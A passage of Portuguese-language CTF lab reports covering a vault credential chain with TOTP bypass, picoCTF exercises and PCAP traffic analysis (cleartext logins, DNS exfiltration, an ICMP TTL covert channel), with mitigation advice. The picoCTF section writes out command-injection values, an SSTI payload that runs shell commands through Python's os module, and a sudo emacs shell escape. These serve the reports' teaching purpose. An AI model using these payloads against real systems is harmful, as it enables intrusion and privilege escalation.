```text
HTTP/1.1 200 OK
```

A página apresentou:

```text
VAULT LEVEL 2 -- TOP SECRET
Welcome, elliot.alderson. Full clearance granted.
```

E revelou os dados finais do projeto Whiterose.

---

## 12. Flag obtida

A flag apresentada no Vault Level 2 foi:

```text
FLAG{ch20_dfc78a554255d760b42b71cffc47c20b}
```

---

## 13. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
SSH para ch20-target como operator
→ análise de .bash_history
→ descoberta de ch20-vault1
→ descoberta de credenciais whiterose / Zh4ng_Pr0j3ct!
→ login no Vault 1
→ acesso a /secrets no Vault 1
→ obtenção das credenciais do Vault 2
→ obtenção do TOTP secret
→ análise do formulário do Vault 2
→ geração de código TOTP
→ correção do problema com ! na password usando set +H
→ login no Vault 2
→ obtenção de cookie de sessão
→ acesso a /vault
→ obtenção da flag final
```

---

## 14. Vulnerabilidades e falhas identificadas

### 14.1. Informação sensível no histórico de comandos

O ficheiro `.bash_history` continha comandos com credenciais e endpoints internos:

```text
username=whiterose
password=Zh4ng_Pr0j3ct!
http://ch20-vault1/secrets
```

Isto permitiu recuperar o acesso ao primeiro vault.

---

### 14.2. Credenciais armazenadas no Vault 1

O Vault 1 continha diretamente credenciais para o Vault 2:

```text
elliot.alderson / Mr.R0b0t_2015!
```

Isto criou uma cadeia de confiança fraca entre os dois vaults.

---

### 14.3. Segredo TOTP exposto

O segredo TOTP do segundo vault estava exposto no Vault 1:

```text
JBSWY3DPEHPK3PXP
```

Com este segredo, foi possível gerar códigos TOTP válidos e contornar a autenticação multifator.

---

### 14.4. MFA dependente de segredo partilhado exposto

Embora o Vault 2 usasse MFA, a segurança foi comprometida porque o segredo TOTP estava armazenado e acessível.

A posse do segredo permitiu gerar qualquer código válido dentro da janela temporal.

---

## 15. Impacto

Esta cadeia de falhas permitiu:

- recuperar credenciais através de histórico de comandos;
- aceder ao Vault Level 1;
- obter credenciais e TOTP secret para o Vault Level 2;
- gerar códigos MFA válidos;
- autenticar no Vault final;
- aceder aos dados classificados do projeto Whiterose;
- obter a flag final.

Num ambiente real, isto representaria um comprometimento crítico de segredos, credenciais e sistemas de autenticação multifator.

---

## 16. Recomendações de mitigação

### 16.1. Evitar credenciais em histórico de comandos

Não devem ser passadas passwords diretamente em comandos que ficam guardados no `.bash_history`.

Exemplo inseguro:

```bash
curl -d "username=user&password=password"
```

Devem ser usados métodos seguros, como prompts interativos, ficheiros protegidos ou secret managers.

---

### 16.2. Limpar históricos sensíveis

Sistemas críticos devem configurar políticas para evitar gravação de comandos sensíveis no histórico.

Medidas possíveis:

```text
HISTCONTROL=ignorespace
HISTFILE=/dev/null para sessões sensíveis
limpeza regular de históricos
```

---

### 16.3. Proteger segredos TOTP

Segredos TOTP devem ser tratados como credenciais sensíveis.

Nunca devem estar visíveis em páginas acessíveis ou armazenados em texto claro.

---

### 16.4. Separar níveis de vault

Um vault de nível inferior não deve conter credenciais completas e segredos MFA para aceder a um vault superior.

O acesso entre vaults deve ser controlado com políticas independentes.

---

### 16.5. Rotação de credenciais e segredos

Após exposição, devem ser rodados:

```text
passwords
cookies
segredos TOTP
tokens de sessão
```

---

### 16.6. Monitorização e alertas

Devem ser monitorizados acessos a:

```text
/secrets
/vault
logins com MFA
geração anormal de códigos
uso de credenciais antigas
```

---

## 17. Conclusão

Neste desafio foi realizada a cadeia final de acesso ao projeto Whiterose.

A partir do acesso inicial ao `ch20-target`, a análise do `.bash_history` revelou comandos anteriores com credenciais para o Vault 1. Após autenticação no Vault 1, foram obtidas as credenciais e o segredo TOTP do Vault 2.

Com o segredo TOTP, foi gerado um código válido e efetuado login no Vault 2. Após guardar a cookie de sessão, foi acedido o endpoint `/vault`, onde estavam os dados finais do projeto.

A flag obtida foi:

![FLAG](resources/2026-05-26-14-15-39.png)

```text
FLAG{ch20_dfc78a554255d760b42b71cffc47c20b}
```

O desafio demonstra que a autenticação multifator só é eficaz quando os segredos associados são protegidos corretamente. Também reforça o risco de deixar credenciais em históricos de comandos e de encadear segredos entre sistemas críticos.

---

# Parte II — Exercícios picoCTF

# Relatório — Exercícios picoCTF

## Índice

1. fixme1.py  
2. fixme2.py  
3. Get aHEAD  
4. Hidden in Plain Sight  
5. Ping-cmd  
6. SSTI1  
7. SUDO MAKE ME A SANDWICH  

---

# 1. Exercício — fixme1.py

## Objetivo

Corrigir um erro existente num script Python para conseguir executar o programa corretamente e obter a flag.

---

## Análise inicial

Ao abrir o ficheiro original, foi possível observar que existia um problema na estrutura do código.

![Ficheiro original](resources/2026-04-14-16-42-22.png)

Ao correr o programa, o Python apresentou um erro de indentação na linha 20.

![Erro ao correr o ficheiro](resources/2026-04-14-16-44-19.png)

---

## Explicação do erro

O erro estava relacionado com a **indentação**.

Em Python, a indentação é essencial porque define blocos de código. Ao contrário de outras linguagens que usam chavetas `{}` ou `;`, Python usa espaços para perceber que instruções pertencem a funções, condições, ciclos ou outros blocos.

Assim, quando uma linha está mal alinhada, o interpretador não consegue perceber corretamente a estrutura lógica do programa.

---

## Correção

Foi corrigido o espaçamento da linha indicada pelo erro, alinhando o código com o bloco correto.

![Ficheiro corrigido](resources/2026-04-14-16-42-59.png)

---

## Conclusão

Após corrigir a indentação, o programa passou a executar corretamente.

Este exercício demonstrou a importância da indentação em Python e como pequenos erros de espaçamento podem impedir a execução de um script.

---

# 2. Exercício — fixme2.py

## Objetivo

Corrigir um erro de sintaxe/lógica num script Python para permitir a execução correta do programa.

---

## Análise inicial

Ao correr o ficheiro `fixme2.py`, o programa apresentou um erro.

![Erro ao correr o ficheiro](resources/2026-04-14-16-59-20.png)

O erro indicava que existia uma instrução mal escrita no código.

---

## Correção

Foi analisada a linha indicada pelo interpretador e corrigida a instrução incorreta.

![Ficheiro corrigido](resources/2026-04-14-17-00-27.png)

---

## Conclusão

Depois da correção, o script executou corretamente.

Este exercício reforçou a importância de ler atentamente os erros apresentados pelo Python, uma vez que estes indicam normalmente a linha e o tipo de problema encontrado.

---

# 3. Exercício — Get aHEAD

## Objetivo

Encontrar a flag através da análise dos métodos HTTP suportados pela aplicação.

---

## Análise inicial

Comecei por testar o endpoint com `curl`, analisando o conteúdo devolvido no body e nos headers.

```bash
curl <URL_DO_DESAFIO>
```

Inicialmente, não foi encontrada a flag.

![Tentativa inicial](resources/2026-04-16-17-08-52.png)

---

## Análise da pista

A pista do desafio sugeria prestar atenção ao termo **HEAD**.

Em HTTP existem vários métodos de pedido, como:

```text
GET
POST
HEAD
PUT
DELETE
```

O método `HEAD` é semelhante ao `GET`, mas devolve apenas os headers da resposta, sem o corpo.

---

## Exploração

Foi então usado o método `HEAD` com `curl`:

```bash
curl -I <URL_DO_DESAFIO>
```

ou:

```bash
curl -X HEAD -i <URL_DO_DESAFIO>
```

Com este pedido, foi possível observar a flag nos headers da resposta.

![Tentativa com HEAD](resources/2026-04-16-17-10-04.png)

![Flag encontrada](resources/2026-04-16-17-12-07.png)

---

## Conclusão

A flag estava escondida nos headers HTTP e só foi revelada ao usar o método correto.

Este exercício demonstrou a importância de conhecer diferentes métodos HTTP e de analisar não só o body, mas também os headers das respostas.

---

# 4. Exercício — Hidden in Plain Sight

## Objetivo

Analisar um ficheiro aparentemente normal e descobrir informação escondida.

---

## Análise inicial

Inicialmente, foi verificado se o ficheiro era realmente uma imagem `.jpg`.

Durante a análise, foi encontrado um comentário codificado em Base64.

![Pista encontrada](resources/2026-04-16-17-39-59.png)

---

## Decodificação da pista

Foi feito o decode da string Base64 encontrada.

![Decode Base64 da pista](resources/2026-04-16-17-42-03.png)

O resultado revelou o nome de um programa e outra informação codificada novamente em Base64.

Foi então feito novo decode para obter a próxima pista.

---

## Execução da ferramenta

Depois de identificar o programa necessário, este foi instalado e executado.

A ferramenta fez download de um ficheiro chamado:

```text
flag.txt
```

Ao abrir esse ficheiro, foi encontrada a flag.

![Flag encontrada](resources/2026-04-16-17-44-40.png)

---

## Conclusão

Este exercício demonstrou que ficheiros aparentemente normais podem conter dados escondidos em metadados, comentários ou camadas de encoding.

Também reforçou a utilidade de técnicas como:

```text
file
strings
exiftool
base64 decode
análise de metadados
```

---

# 5. Exercício — Ping-cmd

## Objetivo

Explorar uma funcionalidade de ping vulnerável a command injection para ler a flag.

---

## Análise inicial

A aplicação aceitava um input que parecia ser usado num comando de ping.

Foram testadas várias formas de command injection:

```text
8.8.8.8$(ls)
8.8.8.8`ls`
8.8.8.8$(cat flag.txt)
8.8.8.8`cat flag.txt`
8.8.8.8|ls
```

![Tentativas e descoberta da flag](resources/2026-04-17-14-58-52.png)

---

## Descoberta da técnica correta

A tentativa com pipe `|` produziu resposta:

```text
8.8.8.8|ls
```

Isto indicou que era possível encadear comandos no sistema.

O operador `|` permite enviar a saída de um comando para outro, mas neste contexto foi útil para fazer o servidor executar outro comando depois do input esperado.

---

## Exploração

Depois de perceber que existia o ficheiro `flag.txt`, foi usado:

```text
8.8.8.8|cat flag.txt
```

Este payload permitiu executar `cat flag.txt` e ler a flag.

---

## Conclusão

Este exercício demonstrou uma vulnerabilidade de **command injection**.

A aplicação não validava corretamente o input antes de o passar para o sistema operativo, permitindo executar comandos arbitrários.

---

# 6. Exercício — SSTI1

## Objetivo

Explorar uma vulnerabilidade de Server-Side Template Injection para executar comandos no servidor e obter a flag.

---

## Conceito

**Server-Side Template Injection (SSTI)** acontece quando o input do utilizador é interpretado pelo servidor como parte da lógica de um template, em vez de ser tratado apenas como texto.

Isto pode permitir:

```text
avaliar expressões
aceder a objetos internos
executar comandos
ler ficheiros sensíveis
```

---

## Teste inicial

Foi usado o payload:

```text
{{7*7}}
```

Se a aplicação devolvesse:

```text
49
```

isso indicaria que o template estava a avaliar expressões do lado do servidor.

---

## Exploração

Depois de confirmar a vulnerabilidade, foi pesquisado um payload adequado para executar comandos através do ambiente do template.

O payload usado foi:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}
```

Este payload importou o módulo `os`, executou o comando:

```bash
cat /challenge/flag
```

e devolveu o conteúdo da flag.

![Flag encontrada](resources/2026-04-20-14-54-22.png)

---

## Conclusão

Este exercício demonstrou o impacto crítico de uma SSTI.

Quando o input do utilizador é processado como template, pode ser possível executar código no servidor e comprometer totalmente a aplicação.

---

# 7. Exercício — SUDO MAKE ME A SANDWICH

## Objetivo

Explorar permissões `sudo` mal configuradas para obter uma shell com privilégios elevados e ler a flag.

---

## Acesso inicial

Foi feito login por SSH no alvo:

```bash
ssh -p 58463 ctf-player@green-hill.picoctf.net
```

---

## Enumeração de permissões sudo

Após o login, foi executado:

```bash
sudo -l
```

Este comando permite ver que comandos o utilizador atual pode executar com `sudo`.

![Permissões sudo encontradas](resources/2026-04-20-15-10-51.png)

Foi identificado que o utilizador podia executar o `emacs` com privilégios elevados.

---

## Exploração com Emacs

Como o `emacs` permite executar comandos e abrir terminais internos, foi usado o seguinte comando:

```bash
sudo /bin/emacs -Q -nw --eval '(term "/bin/sh")'
```

Este comando abriu uma shell através do Emacs com privilégios elevados.

![Flag encontrada](resources/2026-04-20-15-05-48.png)

---

## Conclusão

Este exercício demonstrou uma falha de configuração em `sudo`.

Mesmo que um utilizador não tenha acesso direto a `sudo su`, permitir que execute programas interativos como `emacs`, `vim`, `less` ou outros pode permitir obter uma shell privilegiada.

---

# Conclusão geral

Os exercícios abordaram várias áreas fundamentais de cibersegurança:

```text
debugging em Python
análise de métodos HTTP
forense e metadados
Base64 e encoding
command injection
server-side template injection
privilege escalation com sudo
```

Os principais aprendizados foram:

- ler e interpretar erros de programas;
- verificar código-fonte e headers HTTP;
- não confiar em extensões de ficheiros;
- analisar strings, comentários e metadados;
- validar input antes de o passar ao sistema operativo;
- evitar renderizar input do utilizador como template;
- configurar permissões `sudo` com cuidado;
- perceber que pequenas más configurações podem levar a acesso total ao sistema.

Estes exercícios ajudaram a consolidar conceitos práticos importantes para CTFs e para cenários reais de segurança ofensiva e defensiva.

---

# Parte III — CTF Warmup 

# Relatório — CTF Warmup 

## 1. Objetivo

Foi analisado o ficheiro:

```text
CTF - Warmup-20260414.zip
```

O arquivo continha quatro capturas PCAP:

```text
01.challenge.pcap
02.challenge.pcap
03.challenge.pcap
04.challenge.pcap
```

O objetivo foi analisar o tráfego de rede, identificar credenciais, ficheiros transferidos, exfiltração de dados e canais encobertos.

---

# 2. Preparação

## 2.1. Extração do ZIP

O ficheiro ZIP foi extraído e foram encontrados os seguintes ficheiros:

```text
01.challenge.pcap
02.challenge.pcap
03.challenge.pcap
04.challenge.pcap
```

## 2.2. Ferramentas utilizadas

As principais técnicas usadas foram:

```text
Wireshark
tshark
strings
análise de HTTP
análise de FTP
extração de ficheiros transferidos
análise de DNS
decode de hexadecimal
reconstrução de streams TCP
análise de ICMP
extração de campos de pacotes
```

---

# 3. Challenge 01 — HTTP Cleartext Credentials

## 3.1. Objetivo

Analisar tráfego HTTP e encontrar credenciais submetidas em formulários de login, bem como tokens ou flags devolvidos em respostas JSON.

---

## 3.2. Análise

Foi procurado tráfego HTTP com pedidos `POST` para endpoints de login.

Filtro utilizado no Wireshark:

```text
http.request.method == "POST" && http.request.uri contains "login"
```

Também é possível extrair este tipo de informação com `tshark`:

```bash
tshark -r 01.challenge.pcap -Y 'http.request.method == "POST"' -T fields \
-e urlencoded-form.key \
-e urlencoded-form.value
```

Durante a análise foram encontrados vários pedidos de login com utilizadores e passwords em texto claro.

Exemplos de credenciais encontradas:

```text
jenkins:P@ssw0rd
monitor:password
admin:P@ssw0rd
gideon.goddard:Allsafe#1
deploy:P@ssw0rd
test:changeme
backup:password
svc-account:letmein
angela.moss:Spring2024!
ollie.parker:ollie123
tyrell.wellick:G0dMode!
e.alderson:heckerMan!2015
```

---

## 3.3. Credenciais válidas e token no JSON

Nem todos os logins eram válidos. Algumas respostas devolviam:

```json
{"status":"error","message":"Invalid credentials."}
```

Foram identificadas respostas de sucesso em alguns casos.

Exemplo de resposta bem-sucedida:

```json
{
  "status": "ok",
  "user": "gideon.goddard",
  "role": "cto",
  "session": "b3ef9012-aaaa-bbbb-cccc-111122223333",
  "token": "sess_gideon_not_the_flag"
}
```

A análise das respostas JSON permitiu identificar a flag do challenge.

---

## 3.4. Flag obtida

```text
WARMUP{cl34rt3xt_cr3d5_n3v3r_s4f3}
```

---

## 3.5. Conclusão do Challenge 01

O primeiro PCAP demonstrou exposição de credenciais em tráfego HTTP sem encriptação.

A flag foi encontrada através da análise de:

```text
pedidos POST /login
→ credenciais em texto claro
→ respostas JSON
→ token/flag na resposta
```

Esta captura demonstrou que credenciais e tokens transmitidos sem HTTPS podem ser facilmente recuperados por qualquer pessoa com acesso ao tráfego.

---

# 4. Challenge 02 — FTP Cleartext + ZIP File Carving

## 4.1. Objetivo

Analisar tráfego FTP, identificar logins bem-sucedidos e recuperar ficheiros transferidos pelo canal de dados.

---

## 4.2. Análise do FTP

No ficheiro `02.challenge.pcap`, foi identificado tráfego FTP para o servidor:

```text
10.0.0.15:21
```

Foram encontradas várias sessões FTP com autenticação bem-sucedida.

Credenciais observadas:

```text
lloyd:Pass1234!
gideon:Allsafe#1
tyrell:G0dMode!99
angela:SpringDay!2024
ollie:Welcome1
darlene:fsociety00.dat
```

Exemplo de sessão FTP:

```text
USER darlene
PASS fsociety00.dat
230 User darlene logged in.
STOR secrets.zip
226 Transfer complete.
```

---

## 4.3. Ficheiros transferidos

Foram identificados vários ficheiros `.zip` transferidos via FTP em modo passivo:

```text
audit-data.zip
client-deliverables.zip
board-presentation.zip
q3-report.zip
backup-configs.zip
secrets.zip
```

Foi necessário reconstruir os streams TCP associados às portas passivas FTP.

O ficheiro mais relevante foi:

```text
secrets.zip
```

---

## 4.4. Extração do ficheiro `secrets.zip`

Depois de reconstruir o stream de dados FTP, foi possível abrir o ficheiro ZIP.

Conteúdo encontrado:

```text
confidential/flag.txt
confidential/readme.txt
```

O ficheiro `confidential/flag.txt` continha:

```text
Project: TYRELL WELLICK CONTINGENCY
Classification: EYES ONLY

WARMUP{ftp_f1l3_c4rv1ng_pr0}
```

---

## 4.5. Flag obtida

```text
WARMUP{ftp_f1l3_c4rv1ng_pr0}
```

---

## 4.6. Conclusão do Challenge 02

Este exercício demonstrou a importância de reconstruir ficheiros transferidos por FTP.

A flag foi obtida através de:

```text
análise de sessões FTP
→ identificação de STOR secrets.zip
→ reconstrução do stream TCP
→ extração do ZIP
→ leitura de confidential/flag.txt
```

---

# 5. Challenge 03 — DNS Exfiltration

## 5.1. Objetivo

Analisar tráfego DNS e identificar possível exfiltração de dados.

---

## 5.2. Análise inicial

No ficheiro `03.challenge.pcap`, foi observado um volume elevado de tráfego DNS.

Entre queries normais, foram encontrados domínios suspeitos relacionados com:

```text
darkarm.y.net
```

Alguns registos tinham subdomínios compostos por valores hexadecimais.

Exemplos:

```text
424547494e5f455846494c0a574152.0.x.darkarm.y.net
4d55507b646e735f337866316c5f64.1.x.darkarm.y.net
3474345f6c33346b7d0a454e445f45.2.x.darkarm.y.net
5846494c.3.x.darkarm.y.net
```

---

## 5.3. Interpretação dos subdomínios

Os subdomínios estavam divididos em partes numeradas:

```text
0
1
2
3
```

Cada parte continha dados em hexadecimal.

Foram extraídos e ordenados pelo índice:

```text
0 → 424547494e5f455846494c0a574152
1 → 4d55507b646e735f337866316c5f64
2 → 3474345f6c33346b7d0a454e445f45
3 → 5846494c
```

---

## 5.4. Decode hexadecimal

Ao concatenar os blocos e converter de hexadecimal para texto, obteve-se:

```text
BEGIN_EXFIL
WARMUP{dns_3xf1l_d4t4_l34k}
END_EXFIL
```

---

## 5.5. Flag obtida

```text
WARMUP{dns_3xf1l_d4t4_l34k}
```

---

## 5.6. Conclusão do Challenge 03

Este exercício demonstrou uma técnica de exfiltração via DNS.

A informação foi escondida em subdomínios codificados em hexadecimal e dividida em partes numeradas.

Cadeia de análise:

```text
identificação de domínios suspeitos
→ extração dos subdomínios hexadecimais
→ ordenação pelos índices
→ concatenação dos blocos
→ decode hexadecimal
→ obtenção da flag
```

---

# 6. Challenge 04 — ICMP Covert Channel

## 6.1. Objetivo

Analisar tráfego ICMP e identificar um canal encoberto usado para esconder a flag.

---

## 6.2. Análise inicial

No ficheiro `04.challenge.pcap`, foi observado tráfego ICMP, especialmente pacotes Echo Request.

Ao contrário de tráfego HTTP ou DNS, a informação não estava visível diretamente no payload de uma página ou domínio.

A pista principal estava nos campos dos próprios pacotes ICMP/IP.

---

## 6.3. Identificação do canal encoberto

A análise revelou que a flag estava codificada no campo **IP TTL** dos pacotes ICMP Echo Request.

O campo TTL, normalmente usado para limitar o número de saltos de um pacote na rede, foi abusado como canal encoberto.

A ideia do canal era:

```text
cada Echo Request possui um valor TTL
→ cada TTL representa um carácter
→ os valores TTL em sequência formam a flag
```

---

## 6.4. Extração dos valores TTL

Os valores TTL dos pacotes ICMP Echo Request podem ser extraídos com `tshark`.

Exemplo de comando:

```bash
tshark -r 04.challenge.pcap -Y "icmp.type == 8" -T fields -e ip.ttl
```

Depois, os valores TTL devem ser interpretados como códigos ASCII.

Exemplo conceptual:

```text
87 65 82 77 85 80 ...
→ W A R M U P ...
```

---

## 6.5. Decode dos TTL para ASCII

Depois de extrair a sequência de TTLs, os valores foram convertidos para caracteres ASCII.

O resultado revelou a flag:

```text
WARMUP{ttl_c0v3rt_ch4nn3l}
```

---

## 6.6. Flag obtida

```text
WARMUP{ttl_c0v3rt_ch4nn3l}
```

---

## 6.7. Conclusão do Challenge 04

Este challenge demonstrou uma técnica de **covert channel** usando campos de cabeçalho IP.

Em vez de colocar a flag no payload do pacote, os dados foram codificados no campo TTL dos Echo Request ICMP.

Cadeia de análise:

```text
identificação de tráfego ICMP
→ foco nos Echo Request
→ extração do campo IP TTL
→ conversão dos valores TTL para ASCII
→ obtenção da flag
```

---

# 7. Resumo dos resultados

| Challenge | Técnica principal | Descrição | Flag |
|---|---|---|---|
| 01.challenge.pcap | HTTP cleartext | Credenciais em POST `/login` e token no JSON | `WARMUP{cl34rt3xt_cr3d5_n3v3r_s4f3}` |
| 02.challenge.pcap | FTP cleartext + ZIP | Credenciais FTP e ZIP transferido por canal de dados | `WARMUP{ftp_f1l3_c4rv1ng_pr0}` |
| 03.challenge.pcap | DNS exfiltration | Dados em hex dentro de subdomínios TXT | `WARMUP{dns_3xf1l_d4t4_l34k}` |
| 04.challenge.pcap | ICMP covert channel | Flag codificada no campo IP TTL dos Echo Request | `WARMUP{ttl_c0v3rt_ch4nn3l}` |

---

# 8. Recomendações de segurança

## 8.1. Usar HTTPS em logins

O Challenge 01 mostrou credenciais submetidas em texto claro através de HTTP.

Todos os formulários de login devem usar HTTPS/TLS.

---

## 8.2. Evitar FTP

O Challenge 02 mostrou ficheiros e credenciais expostos em sessões FTP.

FTP transmite credenciais e dados sem encriptação. Deve ser substituído por:

```text
SFTP
FTPS
SCP
HTTPS
```

---

## 8.3. Monitorizar DNS

O Challenge 03 mostrou exfiltração através de subdomínios DNS.

Devem existir controlos para detetar:

```text
subdomínios longos
alto volume de queries
domínios externos suspeitos
dados hex/base64 em queries DNS
```

---

## 8.4. Monitorizar ICMP e campos anómalos

O Challenge 04 mostrou um canal encoberto em ICMP usando o campo TTL.

Devem ser monitorizados:

```text
valores TTL incomuns
sequências de Echo Request com TTL variável
tráfego ICMP excessivo
padrões que representem ASCII ou dados codificados
```

---

# 9. Conclusão geral

A análise dos PCAPs permitiu identificar várias técnicas comuns em investigação de tráfego de rede:

```text
extração de credenciais HTTP
reconstrução de ficheiros FTP
deteção de exfiltração DNS
deteção de covert channel em ICMP
extração de dados a partir de campos de cabeçalho
```

As flags recuperadas foram:

```text
WARMUP{cl34rt3xt_cr3d5_n3v3r_s4f3}
WARMUP{ftp_f1l3_c4rv1ng_pr0}
WARMUP{dns_3xf1l_d4t4_l34k}
WARMUP{ttl_c0v3rt_ch4nn3l}
```

Além das flags, o primeiro PCAP revelou credenciais importantes em texto claro, úteis para encadeamento com outros desafios.
